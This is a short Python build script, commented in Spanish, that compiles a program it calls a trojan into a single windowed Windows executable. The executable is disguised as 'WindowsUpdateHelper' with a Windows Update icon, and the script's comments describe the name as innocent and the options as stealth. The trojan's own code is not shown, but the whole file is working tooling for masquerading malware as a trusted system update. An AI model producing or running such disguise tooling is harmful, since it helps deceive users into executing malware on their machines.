#!/usr/bin/env python3
import subprocess
import sys


def compile_to_exe():
    """Compilar el troyano a ejecutable"""
    try:
        # Instalar PyInstaller si no está instalado
        subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"])

        # Compilar con opciones stealth
        compile_cmd = [
            "pyinstaller",
            "--onefile",  # Un solo archivo ejecutable
            "--windowed",  # Sin consola
            "--name=WindowsUpdateHelper",  # Nombre inocente
            "--icon=update.ico",  # Icono de Windows Update (opcional)
            "--add-data", "*.py;.",  # Incluir módulos
            "windows_update_helper.py"  # Archivo principal
        ]

        subprocess.run(compile_cmd)
        print("✅ Troyano compilado exitosamente!")
        print("📁 Busca en: dist/WindowsUpdateHelper.exe")

    except Exception as e:
        print(f"❌ Error compilando: {e}")


if __name__ == "__main__":
    compile_to_exe()